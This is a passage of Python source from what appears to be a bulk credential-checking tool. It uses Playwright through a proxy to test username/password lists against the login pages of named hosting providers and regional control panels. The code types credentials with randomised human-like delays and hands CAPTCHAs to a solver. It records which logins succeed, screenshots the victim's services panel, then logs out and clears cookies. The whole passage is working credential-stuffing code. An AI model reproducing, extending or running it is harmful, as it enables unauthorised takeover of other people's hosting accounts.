    Extended network monitor that:
    • tracks every request's in-flight state (so callers can detect network-idle)
    • captures POST / PUT / PATCH responses to auth-related endpoints
      (same subset as _setup_response_monitor)

    Returns a tracker dict::

        {
            "in_flight": int,    # requests currently in transit
            "responses": list,   # [{status, url, body}, …] for auth hits
        }
    """
    tracker: dict = {"in_flight": 0, "responses": []}

    def _on_request(_req) -> None:
        tracker["in_flight"] += 1

    def _on_done(_req) -> None:
        tracker["in_flight"] = max(0, tracker["in_flight"] - 1)

    def _on_response(response) -> None:
        try:
            if response.request.method not in ("POST", "PUT", "PATCH"):
                return
            url_lower = response.url.lower()
            if not any(kw in url_lower for kw in _NET_AUTH_URL_KEYWORDS):
                return
            status = response.status
            try:
                body = response.text()[:1_024]
            except Exception:
                body = ""
            tracker["responses"].append(
                {"status": status, "url": response.url, "body": body}
            )
            print(f"[NET] Captured auth response  {status}  {response.url[:80]}")
        except Exception:
            pass

    page.on("request",         _on_request)
    page.on("requestfinished", _on_done)
    page.on("requestfailed",   _on_done)
    page.on("response",        _on_response)
    return tracker


def _wait_network_idle(
    page,
    tracker: dict,
    timeout_ms: int = 5_000,
    stable_ms:  int = 500,
) -> bool:
    """
    Poll until the in-flight request counter is 0 and stays 0 for *stable_ms*
    milliseconds.  ``page.wait_for_timeout(200)`` is called each poll cycle so
    that Playwright's event loop can fire request / response callbacks.

    Returns True if idle was confirmed; False if *timeout_ms* elapsed first.
    """
    poll_ms  = 200
    deadline = time.monotonic() + timeout_ms / 1_000.0
    stable_t: "float | None" = None

    while time.monotonic() < deadline:
        try:
            page.wait_for_timeout(poll_ms)
        except Exception:
            break

        if tracker["in_flight"] == 0:
            if stable_t is None:
                stable_t = time.monotonic()
            elif (time.monotonic() - stable_t) * 1_000 >= stable_ms:
                print("[NET] Network idle confirmed (no in-flight requests)")
                return True
        else:
            print(f"[NET] {tracker['in_flight']} request(s) still in-flight …")
            stable_t = None

    is_idle = tracker["in_flight"] == 0
    if not is_idle:
        print(f"[NET] Network-idle wait timed out ({tracker['in_flight']} still in-flight)")
    return is_idle


def try_login_fast(
    entry: dict,
    custom_login_url: str = "",
    custom_success_url: str = "",
    success_url_exact: bool = True,
    success_dom_selectors: str = "",
    delay: float = 2.0,
    screenshot_on: frozenset = frozenset(),
    custom_user_dom: str = "",    # HTML snippet → CSS selector for username field
    custom_pass_dom: str = "",    # HTML snippet → CSS selector for password field
    custom_submit_dom: str = "",  # HTML snippet → CSS selector for login button
    custom_logout_dom: str = "",  # HTML snippet → CSS selector for logout button
    custom_cookie_dom: str = "",  # HTML snippet → CSS selector for cookie/consent close button
    custom_login_trigger_dom: str = "",  # HTML snippet → CSS selector for modal trigger
    custom_login_tab_dom: str = "",      # HTML snippet → CSS selector for "Login" tab
) -> tuple[str, bytes | None]:
    """
    Fast login checker — optimised linear flow.

    Flow:
      1. Navigate to login URL, wait for DOM ready
      2. Delay (lets JS render overlays/modals)
      3. Dismiss cookie/overlay banners
      4. Find username + password fields via single JS round-trip (fast)
         → if not found: return UNKNOWN
      5. Fill credentials
      6. Delay (configurable, default 2 s — human-like pause before submit)
      7. Find and click login button
      8. Wait for page to reload (domcontentloaded, 15 s)
      9. Check result:
           a. Success DOM selectors (if configured)
           b. Success URL match (if configured)
           c. Keyword / URL-change fallback
     10. Screenshot (if configured)
     11. Clear cookies + best-effort logout click
     12. Return result

    Field detection uses a single JavaScript evaluate() instead of calling
    wait_for_selector() once per selector, which typically saves 10-60 seconds
    of timeout overhead on pages where early selectors don't match.
    """
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

    url      = entry.get("url", "")
    username = entry.get("username", "")
    password = entry.get("password", "")
    proxy    = _load_proxy()

    # ── Resolve login URL ─────────────────────────────────────────────────
    if custom_login_url:
        login_url = custom_login_url
    else:
        domain = entry.get("domain", "").lower()
        if "superhosting" in domain or "superhosting" in url.lower():
            login_url = SUPERHOSTING_LOGIN_URL
        elif "zettahost" in domain or "zettahost" in url.lower():
            login_url = ZETTAHOST_LOGIN_URL
        elif "ns1.bg" in domain or "ns1.bg" in url.lower():
            login_url = NS1_LOGIN_URL
        elif "hostpoint" in domain or "hostpoint" in url.lower():
            login_url = HOSTPOINT_LOGIN_URL
        elif "home.pl" in domain or "panel.home.pl" in url.lower():
            login_url = HOME_PL_LOGIN_URL
        elif "cyberfolks" in domain or "cyberfolks" in url.lower():
            login_url = CYBERFOLKS_LOGIN_URL
        else:
            login_url = url

    print(f"\n[FAST] ── {username} @ {login_url}")

    try:
        with sync_playwright() as pw:
            browser, context = _make_context(pw, headless=False, proxy=proxy)
            page = context.new_page()

            # ── Network tracker (in-flight counting + auth response capture) ─
            _net_tracker = _setup_network_tracker(page)

            try:
                # ── Step 1: Navigate ──────────────────────────────────
                print(f"[FAST] Navigating → {login_url}")
                try:
                    page.goto(login_url, timeout=15_000,
                              wait_until="domcontentloaded")
                except PWTimeout:
                    print("[FAST] goto timed out — continuing anyway")

                # Start all detection/click logic only after the page settles.
                _wait_network_idle(page, _net_tracker, timeout_ms=20_000, stable_ms=800)

                # ── Step 2: Post-navigate delay (let JS render form) ──
                time.sleep(delay)

                # ── Step 3: Dismiss overlays ──────────────────────────
                # Resolve custom DOM selectors from HTML snippets (DOM Settings).
                # These always take priority over cache and JS auto-detection.
                _cust_cookie = _resolve_custom_dom_selector(page, custom_cookie_dom, "cookie")
                _cust_logout = _resolve_custom_dom_selector(page, custom_logout_dom, "logout")
                _cust_user   = _resolve_custom_dom_selector(page, custom_user_dom, "user")
                _cust_pass   = _resolve_custom_dom_selector(page, custom_pass_dom, "pass")
                _cust_submit = _resolve_custom_dom_selector(page, custom_submit_dom, "submit")
                _cust_trigger = _resolve_custom_dom_selector(page, custom_login_trigger_dom, "login_trigger")
                _cust_tab = _resolve_custom_dom_selector(page, custom_login_tab_dom, "login_tab")

                _dismiss_overlays(page, custom_cookie_sel=_cust_cookie)

                # Some portals render the native login form only after clicking
                # an "Entrar/Login" trigger. Reuse the modal-open guard in fast mode
                # so selector detection does not fail with "no login fields".
                _try_open_login_modal(
                    page,
                    timeout_ms=20_000,
                    custom_user_sel=_cust_user,
                    custom_pass_sel=_cust_pass,
                    custom_trigger_sel=_cust_trigger,
                    custom_login_tab_sel=_cust_tab,
                )

                # turkticaret.net: first screen takes only user/email, then
                # redirects to login or register.
                if ("turkticaret.net" in (login_url or "").lower()
                        and "/usermanage/userlogin.php" in (login_url or "").lower()):
                    ok_first_step = _prepare_turkticaret_login_gate(
                        page=page,
                        login_url=login_url,
                        username=username,
                        nav_timeout=timeout,
                    )
                    if not ok_first_step:
                        cur = (page.url or "").lower()
                        if "turkticaret.net" in cur and ("register" in cur or "signup" in cur or "kayit" in cur):
                            screenshot = (_screenshot_page(page)
                                          if _should_screenshot("FAILED", screenshot_on)
                                          else None)
                            return "FAILED", screenshot

                # ── Step 3b: Pre-submit CAPTCHA check ────────────────
                # Some sites show a CAPTCHA on the login page itself
                # before the form is filled.  Check both static HTML and
                # live DOM (widget may be injected by JS after load).
                _pre_html_captcha = _has_captcha(page.content())
                _pre_dom_captcha  = False
                try:
                    _pre_dom_captcha = bool(page.evaluate(_CAPTCHA_PRESENT_JS))
                except Exception:
                    pass
                if _pre_html_captcha or _pre_dom_captcha:
                    print("[FAST] CAPTCHA on login page — waiting for solve…")
                    _pre_solved = _wait_for_captcha_solve(page, timeout_sec=120)
                    if not _pre_solved:
                        print("[FAST] Pre-submit CAPTCHA not solved — returning CAPTCHA status")
                        screenshot = (_screenshot_page(page)
                                      if _should_screenshot("CAPTCHA", screenshot_on)
                                      else None)
                        return "CAPTCHA", screenshot

                # ── Step 4: Detect form fields via JS (single call) ───

                # Check selector cache first to skip detection entirely
                # on pages we've already processed.
                cached = _get_cached_selectors(login_url)
                if cached:
                    user_sel   = cached.user_sel
                    pass_sel   = cached.pass_sel
                    submit_sel = cached.submit_sel
                else:
                    # Build candidate list: BS4-detected name first, then
                    # the full priority list — deduplicated.
                    html = page.content()
                    bs_user, bs_pass = _detect_fields(html)

                    def _dedup(lst):
                        seen: set = set()
                        return [s for s in lst if not (s in seen or seen.add(s))]  # type: ignore

                    user_candidates = _dedup(
                        [f"input[name='{bs_user}']"] + _USER_FIELD_SELECTORS)
                    pass_candidates = _dedup(
                        [f"input[name='{bs_pass}']"] + _PASS_FIELD_SELECTORS)

                    # Single JS round-trip per field — no per-selector timeouts
                    user_sel   = _js_find_selector(page, user_candidates)
                    pass_sel   = _js_find_selector(page, pass_candidates)
                    submit_sel = _js_find_selector(page, _SUBMIT_SELECTORS)

                    if user_sel and pass_sel:
                        _set_cached_selectors(login_url, _FormSelectors(
                            user_sel=user_sel,
                            pass_sel=pass_sel,
                            submit_sel=submit_sel or "button[type='submit']",
                        ))

                # Custom DOM settings override cache / auto-detection when resolved.
                if _cust_user:
                    user_sel = _cust_user
                if _cust_pass:
                    pass_sel = _cust_pass
                if _cust_submit:
                    submit_sel = _cust_submit

                _now_url = ""
                try:
                    _now_url = page.url or ""
                except Exception:
                    _now_url = ""
                _is_turkticaret_step2 = _is_turkticaret_login_step2(_now_url)

                if _is_turkticaret_step2 and not submit_sel:
                    submit_sel = _js_find_selector(
                        page,
                        [
                            "button#submitBtn",
                            "button[onclick*='signIn']",
                            "button:has-text('Giriş yap')",
                            "button:has-text('Giriş Yap')",
                            "button[type='submit']",
                        ],
                    )

                if (not pass_sel) or (not user_sel and not _is_turkticaret_step2):
                    print("[FAST] ✗ Could not find form fields")
                    screenshot = _screenshot_page(page) if _should_screenshot("UNKNOWN", screenshot_on) else None
                    return "UNKNOWN (no login form found)", screenshot

                print(f"[FAST] Fields: user={user_sel!r}  pass={pass_sel!r}  submit={submit_sel!r}")

                # ── Step 5: Fill credentials ──────────────────────────
                if user_sel:
                    try:
                        page.fill(user_sel, "")
                        page.type(user_sel, username, delay=random.randint(40, 90))
                    except Exception as exc:
                        print(f"[FAST] Cannot fill username: {exc}")
                        if not _is_turkticaret_step2:
                            return "ERROR: could not fill username", None

                try:
                    page.fill(pass_sel, "")
                    page.type(pass_sel, password, delay=random.randint(40, 90))
                except Exception as exc:
                    print(f"[FAST] Cannot fill password: {exc}")
                    return "ERROR: could not fill password", None

                # ── Step 6: Pre-submit delay ──────────────────────────
                time.sleep(delay)

                # ── Step 7: Click login button ────────────────────────
                # Wait for page network to be fully idle *before* clicking so
                # we can cleanly diff pre-click vs post-click responses.
                print("[FAST] Waiting for network idle before click …")
                _wait_network_idle(page, _net_tracker, timeout_ms=5_000)
                _pre_click_resp_count = len(_net_tracker["responses"])

                # If no submit selector yet (custom not found or not set),
                # try JS detection now.
                if not submit_sel:
                    submit_sel = _js_find_selector(page, _SUBMIT_SELECTORS)

                if submit_sel:
                    try:
                        if not _click_first_non_social(page, submit_sel, timeout_ms=3_000):
                            raise RuntimeError("no safe non-social submit candidate")
                    except Exception as exc:
                        print(f"[FAST] Safe click failed ({exc}); trying Enter key")
                        try:
                            page.keyboard.press("Enter")
                        except Exception:
                            return "ERROR: could not submit form", None
                else:
                    # No submit button found — try pressing Enter in the pass field
                    try:
                        page.focus(pass_sel)
                        page.keyboard.press("Enter")
                    except Exception:
                        return "ERROR: could not submit form", None

                # ── Step 8: Wait for post-click network to settle ─────
                # Traditional logins: full page navigation → domcontentloaded.
                # SPA / AJAX logins: no navigation, but XHR/Fetch requests fire.
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=15_000)
                except PWTimeout:
                    pass   # SPA / AJAX login — no full navigation, that's OK

                print("[FAST] Waiting for post-click network activity to finish …")
                _wait_network_idle(page, _net_tracker, timeout_ms=10_000)

                # Brief settle delay so JS can update the DOM
                time.sleep(max(0.5, delay * 0.5))

                # ── Step 8b: CAPTCHA check ────────────────────────────
                # CAPTCHA widgets are injected dynamically by JS, so we
                # wait an extra 2 s for the iframe/widget to render before
                # checking.  We use BOTH a live JS DOM query and the HTML
                # snapshot so neither fast nor slow renderers slip through.
                time.sleep(2.0)
                _post_click_html = page.content()
                _captcha_in_html = _has_captcha(_post_click_html)
                _captcha_in_dom  = False
                try:
                    _captcha_in_dom = bool(page.evaluate(_CAPTCHA_PRESENT_JS))
                except Exception:
                    pass

                if _captcha_in_html or _captcha_in_dom:
                    print("[FAST] CAPTCHA detected after submit — waiting for solve…")
                    _url_before_solve = page.url
                    _captcha_solved = _wait_for_captcha_solve(page, timeout_sec=120)
                    if _captcha_solved:
                        _is_whmcs_login = _is_whmcs_recaptcha_login_page(page)
                        if _is_whmcs_login:
                            # WHMCS-style forms often require a valid token before
                            # clicking the login button; checkbox UI state alone is
                            # not enough to guarantee backend acceptance.
                            if not _wait_for_recaptcha_token(page, timeout_sec=45):
                                print("[FAST] reCAPTCHA token not ready after solve — returning CAPTCHA status")
                                screenshot = (_screenshot_page(page)
                                              if _should_screenshot("CAPTCHA", screenshot_on)
                                              else None)
                                return "CAPTCHA", screenshot
                        # Some solver extensions auto-submit the form after
                        # filling the token.  If the URL already changed,
                        # the form was submitted — don't click again.
                        _url_after_solve = page.url
                        if _url_after_solve != _url_before_solve:
                            print("[FAST] CAPTCHA solved + auto-submitted — skipping re-click")
                            _wait_network_idle(page, _net_tracker, timeout_ms=10_000)
                            time.sleep(max(0.5, delay * 0.5))
                        else:
                            # Re-click the login button.
                            # The original submit_sel was found on the login
                            # page — verify it still exists; if not, detect a
                            # new one on the current (CAPTCHA) page.
                            print("[FAST] CAPTCHA solved — re-clicking login button")
                            time.sleep(1.0)
                            _reclick_sel = None
                            if _is_whmcs_login:
                                _reclick_sel = "input#login"
                            if submit_sel:
                                try:
                                    if page.query_selector(submit_sel):
                                        _reclick_sel = submit_sel
                                except Exception:
                                    pass
                            if not _reclick_sel:
                                _reclick_sel = _js_find_selector(page, _SUBMIT_SELECTORS)

                            if _reclick_sel:
                                try:
                                    if not _click_first_non_social(page, _reclick_sel, timeout_ms=3_000):
                                        raise RuntimeError("no safe non-social reclick candidate")
                                except Exception:
                                    try:
                                        page.keyboard.press("Enter")
                                    except Exception:
                                        pass
                            else:
                                try:
                                    page.keyboard.press("Enter")
                                except Exception:
                                    pass

                            # Wait for post-CAPTCHA navigation / network
                            try:
                                page.wait_for_load_state("domcontentloaded", timeout=15_000)
                            except PWTimeout:
                                pass
                            _wait_network_idle(page, _net_tracker, timeout_ms=10_000)
                            time.sleep(max(0.5, delay * 0.5))
                    else:
                        print("[FAST] CAPTCHA not solved within timeout — returning CAPTCHA status")
                        screenshot = (_screenshot_page(page)
                                      if _should_screenshot("CAPTCHA", screenshot_on)
                                      else None)
                        return "CAPTCHA", screenshot

                # ── Step 9: Determine result ──────────────────────────
                final_url  = page.url
                print(f"[FAST] Final URL: {final_url}")

                result: str

                # Simple rule:
                #   1. success DOM element found → SUCCESS
                #   2. success URL matched        → SUCCESS
                #   3. redirected away from login → SUCCESS
                #   4. anything else              → FAILED
                _dom_sels = _parse_success_dom_selectors(success_dom_selectors)
                if _dom_sels and _check_success_dom(page, _dom_sels):
                    result = "SUCCESS"
                elif custom_success_url:
                    su = custom_success_url.lower().rstrip("/")
                    fu = final_url.lower().rstrip("/")
                    result = "SUCCESS" if (su == fu if success_url_exact else su in fu) else "FAILED"
                elif final_url.lower().rstrip("/") != login_url.lower().rstrip("/") and not _url_has_login_marker(final_url):
                    result = "SUCCESS"
                else:
                    result = "FAILED"

                print(f"[FAST] Result → {result}")

                # ── Step 10: Screenshot ───────────────────────────────
                screenshot = None
                if (
                    result == "SUCCESS"
                    and (_is_freehosting_url(login_url) or _is_freehosting_url(final_url))
                ):
                    # Requirement: on successful FreeHosting login, open services
                    # page and capture a screenshot before closing.
                    screenshot = _capture_freehosting_services_screenshot(page)
                elif (
                    result == "SUCCESS"
                    and (_is_sprintdc_url(login_url) or _is_sprintdc_url(final_url))
                ):
                    # Requirement: on successful SprintDC login, open panel
                    # page and capture a screenshot before closing.
                    screenshot = _capture_sprintdc_panel_screenshot(page)
                if screenshot is None and _should_screenshot(result, screenshot_on):
                    screenshot = _screenshot_page(page)

                # ── Step 11: Clear cookies + best-effort logout ───────
                try:
                    if _cust_logout and _js_find_selector(page, [_cust_logout]):
                        page.click(_cust_logout, timeout=3_000)
                    else:
                        _try_logout(page)
                    time.sleep(0.3)
                except Exception:
                    pass
                try:
                    context.clear_cookies()
                except Exception:
                    pass

                return result, screenshot

            finally:
                try:
                    _cleanup_context(context)
                    if browser:
                        browser.close()
                except Exception:
                    pass

    except Exception as exc:
        err = str(exc).lower()
        print(f"[FAST] EXCEPTION {type(exc).__name__}: {exc}")
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE", None
        if "timeout" in err:
            return "TIMEOUT", None
        return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}", None



# ─────────────────────────────────────────────────────────────────────────────
# CREDENTIAL FILTERING INTEGRATION
# ─────────────────────────────────────────────────────────────────────────────
# Deduplicate credentials before batch processing

def filter_duplicate_credentials(
    entries: list[dict],
    verbose: bool = True,
) -> tuple[list[dict], dict]:
    """
    Remove exact duplicate credentials (same domain + username + password).
    
    This is a preprocessing step recommended before batch checking to avoid
    wasting time on duplicate credentials.
    
    Parameters
    ----------
    entries : list[dict]
        List of credentials with keys: username, password, url
    verbose : bool
        Print filtering report
    
    Returns
    -------
    (filtered_entries, report) where:
        filtered_entries : deduplicated credential list
        report : dict with filtering statistics
    
    Example
    -------
    >>> from src.parser import parse_credential_line
    >>> creds = [parse_credential_line(line) for line in open("creds.txt")]
    >>> cleaned, report = filter_duplicate_credentials(creds)
    >>> print(f"Removed {report['duplicates_removed']} duplicates")
    """
    from src.credential_filter import prepare_batch
    
    filtered, filter_report = prepare_batch(entries, remove_duplicates=True, verbose=verbose)
    
    report = {
        "total_initial": filter_report.total_input,
        "total_after_filter": filter_report.total_output,
        "duplicates_removed": filter_report.duplicates_count,
        "suspicious_accounts": len(filter_report.suspicious_accounts),
        "high_volume_domains": len(filter_report.high_volume_domains),
        "invalid_skipped": len(filter_report.skipped),
    }
    
    return filtered, report


def try_login_interactive(
    entry: dict,
    custom_login_url: str = "",
    custom_success_url: str = "",
    success_url_exact: bool = True,
    captcha_wait_timeout: int = 0,     # 0 = wait forever until user solves CAPTCHA
    nav_timeout: int = 60,             # generous timeout for slow-loading portals
    screenshot_on: frozenset = frozenset(),
    success_dom_selectors: str = "",
    custom_user_dom: str = "",    # HTML snippet → CSS selector for username field
    custom_pass_dom: str = "",    # HTML snippet → CSS selector for password field
    custom_submit_dom: str = "",  # HTML snippet → CSS selector for login button
    custom_logout_dom: str = "",  # HTML snippet → CSS selector for logout button
    custom_cookie_dom: str = "",  # HTML snippet → CSS selector for cookie/consent close button
    custom_login_trigger_dom: str = "",  # HTML snippet → CSS selector for modal trigger
    custom_login_tab_dom: str = "",      # HTML snippet → CSS selector for "Login" tab
) -> tuple[str, bytes | None]:
    """
    General-purpose interactive login checker.

    Algorithm (modelled on the working _try_login_zettahost / _try_login_ns1):
      1. Navigate to the login URL, wait for the page to be fully ready
         (domcontentloaded → networkidle → first visible <input>).
      2. Scan visible inputs to find the best username & password selectors.
      3. Fill credentials with page.fill() + page.type() (same as dedicated handlers).
      4. Click submit button wrapped in expect_navigation so we catch the redirect.
      5. Wait for networkidle on the result page.
      6. Evaluate the result (custom_success_url or keyword analysis).
      7. If a CAPTCHA appears at any point, pause and let the user solve it,
         then automatically re-fill + re-submit.

    Returns SUCCESS / FAILED / UNKNOWN / CAPTCHA (timed-out) / ERROR.
    """
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

    url      = entry.get("url", "")
    username = entry.get("username", "")
    password = entry.get("password", "")
    proxy    = _load_proxy()

    # ── Resolve login URL ─────────────────────────────────────────────────
    if custom_login_url:
        login_url = custom_login_url
    else:
        domain = entry.get("domain", "").lower()
        if "superhosting" in domain or "superhosting" in url.lower():
            login_url = SUPERHOSTING_LOGIN_URL
        elif "zettahost" in domain or "zettahost" in url.lower():
            login_url = ZETTAHOST_LOGIN_URL
        elif "ns1.bg" in domain or "ns1.bg" in url.lower():
            login_url = NS1_LOGIN_URL
        elif "hostpoint" in domain or "hostpoint" in url.lower():
            login_url = HOSTPOINT_LOGIN_URL
        elif "home.pl" in domain or "panel.home.pl" in url.lower():
            login_url = HOME_PL_LOGIN_URL
        elif "cyberfolks" in domain or "cyberfolks" in url.lower():
            login_url = CYBERFOLKS_LOGIN_URL
        elif "sprintdatacenter" in domain or "sprintdatacenter" in url.lower():
            login_url = SPRINTDC_LOGIN_URL
        elif "domenomania" in domain or "domenomania" in url.lower():
            login_url = DOMENOMANIA_LOGIN_URL
        elif "rapiddc" in domain or "rapiddc" in url.lower():
            login_url = RAPIDDC_LOGIN_URL
        else:
            login_url = url

    print(f"\n[INTERACTIVE] ── {username} @ {login_url}")

    # ── Convert custom HTML snippets → CSS selectors ───────────────────────
    _ci_user_sel   = _html_to_css_selector(custom_user_dom)   if custom_user_dom.strip()   else None
    _ci_pass_sel   = _html_to_css_selector(custom_pass_dom)   if custom_pass_dom.strip()   else None
    _ci_submit_sel = _html_to_css_selector(custom_submit_dom) if custom_submit_dom.strip() else None
    _ci_logout_sel = _html_to_css_selector(custom_logout_dom) if custom_logout_dom.strip() else None
    _ci_cookie_sel = _html_to_css_selector(custom_cookie_dom) if custom_cookie_dom.strip() else None
    _ci_trigger_sel = _html_to_css_selector(custom_login_trigger_dom) if custom_login_trigger_dom.strip() else None
    _ci_tab_sel = _html_to_css_selector(custom_login_tab_dom) if custom_login_tab_dom.strip() else None

    def _has_captcha(html_lower: str) -> bool:
        return ("captcha" in html_lower or "recaptcha" in html_lower
                or "hcaptcha" in html_lower)

    def _needs_captcha_retry(html_lower: str) -> bool:
        return any(ph in html_lower for ph in _CAPTCHA_RETRY_PHRASES)

    def _dump_inputs(page) -> None:
        """Print all non-hidden inputs for debugging."""
        try:
            inputs = page.query_selector_all("input:not([type='hidden'])")
            print(f"[DEBUG] {len(inputs)} non-hidden input(s) on page:")
            for inp in inputs:
                n = inp.get_attribute("name") or ""
                t = inp.get_attribute("type") or "text"
                i = inp.get_attribute("id") or ""
                p = inp.get_attribute("placeholder") or ""
                v = inp.is_visible()
                print(f"        name={n!r:20} type={t!r:10} id={i!r:20} "
                      f"placeholder={p!r:24} visible={v}")
        except Exception as exc:
            print(f"[DEBUG] Could not list inputs: {exc}")

    def get_window_position(index):
        x = (index % 5) * 400   # columns
        y = (index // 5) * 300  # rows
        return f"{x},{y}"
    
    def _fill_and_submit(page) -> bool:
        """Delegates to the module-level _generic_fill_and_submit helper
        (same logic used by scrape_after_login and Check All).
        """
        return _generic_fill_and_submit(
            page, login_url, username, password, nav_timeout=nav_timeout,
            custom_user_sel=_ci_user_sel,
            custom_pass_sel=_ci_pass_sel,
            custom_submit_sel=_ci_submit_sel,
            custom_cookie_sel=_ci_cookie_sel,
            custom_login_trigger_sel=_ci_trigger_sel,
            custom_login_tab_sel=_ci_tab_sel,
        )

    # ── Main Playwright session ───────────────────────────────────────────
    try:
        with sync_playwright() as pw:
            browser, context = _make_context(
                pw, 
                headless=False, 
                proxy=proxy, 
            )
            page = context.new_page()

            # Forward browser console / errors to our terminal
            page.on("console", lambda m: print(f"[BROWSER] [{m.type}] {m.text}"))
            page.on("pageerror", lambda e: print(f"[BROWSER-ERR] {e}"))
            page.on("response", lambda r: print(f"[HTTP] {r.status} {r.url[:120]}")
                    if r.status >= 400 else None)

            # ── Network tracker (in-flight counting + auth response capture) ──
            _net_tracker = _setup_network_tracker(page)

            try:
                # ── Step 1: Navigate ──────────────────────────────────────
                print(f"[INTERACTIVE] Navigating → {login_url}")
                try:
                    page.goto(login_url, timeout=nav_timeout * 1000,
                              wait_until="domcontentloaded")
                except PWTimeout:
                    print("[INTERACTIVE] goto timed out — continuing anyway")
                print(f"[INTERACTIVE] Landed on: {page.url}")

                # ── Step 2: First fill + submit attempt ───────────────────
                # Snapshot response count before fill+submit so we can later
                # diff only the auth responses that arrive after the click.
                _pre_click_resp_count = len(_net_tracker["responses"])
                ok = _fill_and_submit(page)
                if not ok:
                    now = (page.url or "").lower()
                    if ("turkticaret.net" in now
                            and ("register" in now or "signup" in now or "kayit" in now)):
                        print("[INTERACTIVE] turkticaret redirected to register (unknown user/email)")
                        return "FAILED (not registered user/email)", None
                    print("[INTERACTIVE] ✗ Could not fill form — skipping")
                    return "UNKNOWN (could not fill form)", None

                # ── Step 3: Wait for result page to settle ────────────────
                print("[INTERACTIVE] Waiting for result page to settle...")
                try:
                    page.wait_for_load_state("networkidle", timeout=20_000)
                except PWTimeout:
                    pass
                # Also wait via our tracker so AJAX/XHR auth responses are captured.
                _wait_network_idle(page, _net_tracker, timeout_ms=10_000)
                print(f"[INTERACTIVE] After submit URL: {page.url}")

                _random_delay(0.8, 1.5)

                # ── Step 4: CAPTCHA / retry loop ──────────────────────────
                # Strategy: poll every 2 s.
                #   • If URL changed away from login page  → user solved CAPTCHA
                #     and the form was already submitted → done.
                #   • If still on login page but no CAPTCHA error phrase visible
                #     → CAPTCHA was just solved; re-submit the form.
                #   • If still on login page with CAPTCHA error phrase → keep waiting.
                # No timeout — we wait as long as the user needs.
                _captcha_detected = _has_captcha(page.content().lower())
                if _captcha_detected:
                    print("[INTERACTIVE] CAPTCHA detected — waiting for user to solve (no timeout)...")

                while _captcha_detected:
                    try:
                        page.wait_for_timeout(2_000)
                    except Exception:
                        print("[INTERACTIVE] Browser closed while waiting for CAPTCHA")
                        return "CAPTCHA", None

                    try:
                        current_url  = page.url
                        current_html = page.content().lower()
                    except Exception:
                        print("[INTERACTIVE] Browser closed while waiting for CAPTCHA")
                        return "CAPTCHA", None

                    # Case 1: navigated away from the login page → CAPTCHA solved + submitted
                    if current_url.rstrip("/") != login_url.rstrip("/"):
                        print(f"[INTERACTIVE] URL changed to {current_url} — CAPTCHA solved, form submitted")
                        try:
                            page.wait_for_load_state("networkidle", timeout=15_000)
                        except PWTimeout:
                            pass
                        _captcha_detected = False
                        break

                    # Case 2: still on login page, no "please complete captcha" error →
                    # user just finished the widget, re-submit the form.
                    # BUT first verify there is no login-failure alert visible —
                    # if "Login Details Incorrect" (etc.) is shown, re-submitting
                    # won't help; the credential is simply wrong.
                    if not _needs_captcha_retry(current_html):
                        try:
                            if page.evaluate(_ERROR_ALERT_JS):
                                print("[INTERACTIVE] Login failure alert detected after CAPTCHA — credential is FAILED")
                                _captcha_detected = False
                                break
                        except Exception:
                            pass
                        print("[INTERACTIVE] CAPTCHA solved — re-submitting form...")
                        _random_delay(0.3, 0.7)
                        _pre_click_resp_count = len(_net_tracker["responses"])
                        try:
                            if _is_whmcs_recaptcha_login_page(page):
                                if not _wait_for_recaptcha_token(page, timeout_sec=45):
                                    print("[INTERACTIVE] reCAPTCHA token not ready yet — keep waiting")
                                    continue
                                _resubmit_sel = "input#login"
                                try:
                                    if not page.query_selector(_resubmit_sel):
                                        _resubmit_sel = _js_find_selector(page, _SUBMIT_SELECTORS)
                                except Exception:
                                    _resubmit_sel = _js_find_selector(page, _SUBMIT_SELECTORS)

                                if _resubmit_sel and _click_first_non_social(page, _resubmit_sel, timeout_ms=3_000):
                                    pass
                                else:
                                    page.keyboard.press("Enter")
                            else:
                                _fill_and_submit(page)
                            try:
                                page.wait_for_load_state("networkidle", timeout=20_000)
                            except PWTimeout:
                                pass
                            _wait_network_idle(page, _net_tracker, timeout_ms=10_000)
                            _random_delay(0.8, 1.5)
                        except Exception as e:
                            print(f"[INTERACTIVE] Re-submit after CAPTCHA failed: {e}")
                        continue  # re-evaluate URL on next iteration

                    # Case 3: error phrase still present → user hasn't solved yet
                    print("[INTERACTIVE] Waiting for user to solve CAPTCHA...")

                # ── Step 5: Final networkidle settle ──────────────────────
                try:
                    page.wait_for_load_state("networkidle", timeout=8_000)
                except PWTimeout:
                    pass
                # Final tracker-level idle check (catches any lagging AJAX requests).
                _wait_network_idle(page, _net_tracker, timeout_ms=5_000)
                _random_delay(0.5, 1.0)

                html_after = page.content()
                final_url  = page.url
                print(f"[INTERACTIVE] Final URL: {final_url}")

                # ── Step 6: Determine result ──────────────────────────────
                # Simple rule:
                #   1. success DOM element found → SUCCESS
                #   2. success URL matched        → SUCCESS
                #   3. redirected away from login → SUCCESS
                #   4. anything else              → FAILED
                _dom_sels = _parse_success_dom_selectors(success_dom_selectors)
                if _dom_sels and _check_success_dom(page, _dom_sels):
                    result = "SUCCESS"
                elif custom_success_url:
                    su = custom_success_url.lower().rstrip("/")
                    fu = final_url.lower().rstrip("/")
                    result = "SUCCESS" if (su == fu if success_url_exact else su in fu) else "FAILED"
                elif final_url.lower().rstrip("/") != login_url.lower().rstrip("/") and not _url_has_login_marker(final_url):
                    result = "SUCCESS"
                else:
                    result = "FAILED"

                print(f"[INTERACTIVE] Result → {result}")
                screenshot = None
                if (
                    result == "SUCCESS"
                    and (_is_freehosting_url(login_url) or _is_freehosting_url(final_url))
                ):
                    # Requirement: on successful FreeHosting login, open services
                    # page and capture a screenshot before closing.
                    screenshot = _capture_freehosting_services_screenshot(page)
                elif (
                    result == "SUCCESS"
                    and (_is_sprintdc_url(login_url) or _is_sprintdc_url(final_url))
                ):
                    # Requirement: on successful SprintDC login, open panel
                    # page and capture a screenshot before closing.
                    screenshot = _capture_sprintdc_panel_screenshot(page)
                if screenshot is None and _should_screenshot(result, screenshot_on):
                    screenshot = _screenshot_page(page)
                return result, screenshot

            finally:
                try:
                    _cleanup_context(context)
                    if browser:
                        browser.close()
                except Exception:
                    pass

    except Exception as e:
        err = str(e).lower()
        print(f"[INTERACTIVE] EXCEPTION {type(e).__name__}: {e}")
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE", None
        if "timeout" in err:
            return "TIMEOUT", None
        return f"ERROR: {type(e).__name__}: {str(e)[:80]}", None


